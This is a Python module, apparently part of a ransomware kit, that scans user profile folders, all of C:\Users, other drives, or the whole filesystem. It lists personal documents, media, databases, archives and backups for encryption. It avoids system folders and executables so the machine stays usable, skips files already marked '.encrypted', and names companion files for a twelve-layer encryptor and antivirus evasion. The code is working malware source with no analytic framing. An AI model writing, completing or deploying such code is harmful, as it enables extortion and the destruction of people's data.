import os
import platform
import ctypes
from collections import defaultdict


def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def escanear_sistema():
    sistema = platform.system()
    admin = es_admin()
    
    # PROTECCIÓN CRÍTICA: Carpetas del sistema que NUNCA se deben tocar
    carpetas_sistema_criticas = {
        'Windows', 'WINDOWS', 'windows',
        'Windows\\System32', 'Windows\\SysWOW64', 'Windows\\WinSxS',
        'Windows\\Boot', 'Windows\\Fonts', 'Windows\\Cursors',
        'Windows\\PolicyDefinitions', 'Windows\\schemas',
        'Windows\\security', 'Windows\\ServerSetup',
        'Windows\\servicing', 'Windows\\Setup', 'Windows\\ShellNew',
        'Windows\\Speech', 'Windows\\System', 'Windows\\Tasks',
        'Windows\\TAPI', 'Windows\\tracing', 'Windows\\twain_32',
        'Windows\\Web', 'Windows\\WindowsUpdate', 'Windows\\WaaS',
        'Program Files', 'Program Files (x86)',
        'Program Files\\Windows', 'Program Files (x86)\\Windows',
        'ProgramData', 'ProgramData\\Microsoft',
        'ProgramData\\Microsoft\\Windows',
        '$Recycle.Bin', 'python_portable', 
        'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft',
        'AppData\\Roaming\\Microsoft\\Windows',
        'AppData\\LocalLow\\Microsoft',
        'PerfLogs', 'Windows.old', 'Recovery',
        'System Volume Information', '$WINDOWS.~BT',
        'Windows\\Installer', 'Windows\\assembly',
        'Windows\\Microsoft.NET', 'Windows\\Panther',
        'Windows\\ServiceProfiles', 'Windows\\SoftwareDistribution',
        'Windows\\SystemResources', 'Windows\\Vss',
        'Windows\\CSC', 'Windows\\CbsTemp',
        'Windows\\Containers', 'Windows\\Downloaded Program Files',
        'Windows\\ehome', 'Windows\\Help', 'Windows\\IME',
        'Windows\\inf', 'Windows\\LiveKernelReports',
        'Windows\\Logs', 'Windows\\Migration',
        'Windows\\ModemLogs', 'Windows\\Offline Web Pages',
        'ProgramData\\Microsoft\\Diagnosis',
        'ProgramData\\Microsoft\\Network',
        'ProgramData\\Microsoft\\Search',
        'ProgramData\\Package Cache',
        'AppData\\Local\\Microsoft\\Windows\\Explorer',
        'AppData\\Local\\Microsoft\\Windows\\Shell',
        'AppData\\Local\\Microsoft\\Windows\\INetCache',
        'AppData\\Local\\Microsoft\\Windows\\WebCache',
        'AppData\\Local\\Microsoft\\Windows\\History',
        'AppData\\Local\\Packages',
        'Intel', 'AMD', 'NVIDIA', 'Drivers'
    }
    
    # EXTENSIONES SEGURAS: Solo archivos de usuario
    extensiones = {
        '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
        '.odt', '.ods', '.odp', '.rtf',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.psd',
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
        '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a',
        '.zip', '.rar', '.7z', '.tar', '.gz',
        '.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb',
        '.csv', '.json', '.xml', '.html', '.css', '.js', '.php', '.py',
        '.java', '.c', '.cpp', '.h', '.cs', '.go', '.rb',
        '.bak', '.backup'
    }
    
    # EXTENSIONES PROHIBIDAS: NUNCA tocar (archivos del sistema)
    extensiones_prohibidas = {
        '.exe', '.dll', '.sys', '.scr', '.cpl', '.drv',
        '.msi', '.cab', '.inf', '.cat',
        '.mui', '.nls', '.dat',
        '.ttf', '.fon', '.otf',
        '.theme', '.msstyles',
        '.reg', '.pol',
        '.evtx', '.etl',
        '.sav', '.log',
        '.icm', '.icc',
        '.adm', '.admx', '.adml',
    }
    
    # SIEMPRE evitar carpetas críticas
    evitar_parcial = carpetas_sistema_criticas
    
    archivos_app = {'launcher.py', 'rutas.py', 'encriptador_12_capas.py', 'evasion_av.py', 'launcher.bat', 'launcher.sh'}
    dir_app = os.path.abspath(os.getcwd())
    archivos_encontrados = []
    contador_ext = defaultdict(int)
    total = 0
    
    if sistema == "Windows":
        # PROTECCIÓN: NO escanear C:\ completo
        rutas_escanear = [
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Downloads'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Pictures'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Videos'),
            os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Music'),
            'C:\\Users'
        ]
        
        # Agregar otras unidades (D-Z)
        for letra in 'DEFGHIJKLMNOPQRSTUVWXYZ':
            unidad = f'{letra}:\\'
            if os.path.exists(unidad):
                rutas_escanear.append(unidad)
    else:
        rutas_escanear = ['/home', '/']
    
    for ruta_base in rutas_escanear:
        if not os.path.exists(ruta_base):
            continue
        try:
            for root, dirs, files in os.walk(ruta_base):
                # PROTECCIÓN: Excluir carpetas críticas
                debe_excluir = False
                for carpeta_exc in evitar_parcial:
                    if carpeta_exc in root:
                        debe_excluir = True
                        dirs[:] = []
                        break
                
                # PROTECCIÓN ADICIONAL: Detectar Windows directamente
                if root.startswith('C:\\Windows') or '\\Windows\\' in root:
                    dirs[:] = []
                    continue
                
                # PROTECCIÓN: Detectar Program Files
                if 'Program Files' in root or 'ProgramData' in root:
                    dirs[:] = []
                    continue
                    
                if debe_excluir:
                    continue
                
                root_abs = os.path.abspath(root)
                if root_abs == dir_app:
                    dirs[:] = []
                    continue
                
                for archivo in files:
                    try:
                        total += 1
                        if archivo.lower() in [x.lower() for x in archivos_app]:
                            continue
                        if archivo.endswith('.encrypted'):
                            continue
                        
                        ext = os.path.splitext(archivo)[1].lower()
                        
                        # PROTECCIÓN: NO encriptar archivos del sistema
                        if ext in extensiones_prohibidas:
                            continue
                        
                        ruta_completa = os.path.join(root, archivo)
                        incluir = False
                        
                        if ext in extensiones:
                            incluir = True
                        elif ext == '':
                            incluir = True
                            ext = '[sin_ext]'
                        
                        if incluir:
                            archivos_encontrados.append(ruta_completa)
                            contador_ext[ext] += 1
                    except:
                        continue
        except:
            continue
    
    return archivos_encontrados, contador_ext, total
